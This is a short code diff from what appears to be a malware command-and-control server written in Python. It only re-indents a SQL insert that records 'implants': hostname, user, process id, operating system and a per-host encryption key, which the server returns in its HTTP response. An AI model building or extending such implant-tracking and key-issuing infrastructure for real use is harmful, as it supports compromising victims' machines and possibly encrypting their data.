@@ -103,11 +103,11 @@ class WebServer(object):
                 with self.connection.cursor() as cursor:
                     statement = "INSERT INTO `implants` (`hostname`, `current_user`, `process_id`, `operating_system`, `last_seen`, `encryption_key`) VALUES (%s, %s, %s, %s, %s, %s)"
                     cursor.execute(statement, (hostname,
-                                           current_user,
-                                           process_id,
-                                           operating_system,
-                                           time,
-                                           encryption_key))
+                                               current_user,
+                                               process_id,
+                                               operating_system,
+                                               time,
+                                               encryption_key))
 
                 # returns Base64 encoded encryption key in the HTTP response
                 return base64.b64encode(encryption_key.encode())
